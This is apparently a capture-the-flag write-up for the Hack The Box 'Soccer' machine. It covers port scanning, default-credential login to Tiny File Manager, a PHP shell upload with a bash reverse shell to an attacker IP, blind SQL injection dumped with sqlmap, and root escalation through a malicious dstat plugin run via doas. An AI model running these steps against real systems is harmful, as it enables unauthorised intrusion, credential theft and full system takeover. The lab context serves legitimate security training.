# Enumeration
```
Nmap scan report for 10.10.11.194
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```
The port 80 leads to a website called soccer.htb.
Using gobuster we find a directory called /tiny running tiny file manager.
![](attachment/c39697f0699b3df0f73c0be6d7239408.png)
Using default creds we get in 
`admin:admin@123`
We can upload a shell.php and use `bash -c 'bash -i >& /dev/tcp/10.10.14.37/9001 0>&1'` to get a shell:
![](attachment/d260e60676e5312dd19f5b0083581a43.png)
Enumerating files at /etc/nginx we find a vhost `http://soc-player.soccer.htb/check`
There is a blind sql after login:
It only shows true or false. So should use queries like `0 UNION select user,2,3 from mysql.user where user like 'a%'-- -`
So using sqlmap:
`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3`

Now checking databases:
`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -threads 10 -dbs`

Then finding tables:
`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -threads 10 -D soccer_db --tables`
Here we found accounts table

Now dumping accounts table:
`sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 -threads 10 -D soccer_db -T accounts --dump`
![](attachment/08dc4df0cc73c05afe784b8a2736c358.png)
Now logging in using ssh:
![](attachment/4449d4f53ab04d07e5e1f4c31992770f.png)

We found a group writeable file called dstat.
we also found an SUID binary called doas. It allows execution of commands as other users.
To find the config file: `find / 2>/dev/null | grep doas`
It seems we can run dstat as root.

Checking the plugins we can run in `/usr/share/dstat/`
We can also create a plugin in`/usr/local/share/dstat`
so creating a plugin called `dstat_shell.py` with
```python
import os; os.execv("/bin/sh", ["sh"])
```
Now we can run dstat plugin with `doas /usr/bin/dstat --shell`
![](attachment/96f4b91f944473bc345dfddfd56e1ebc.png)We get a root shell.

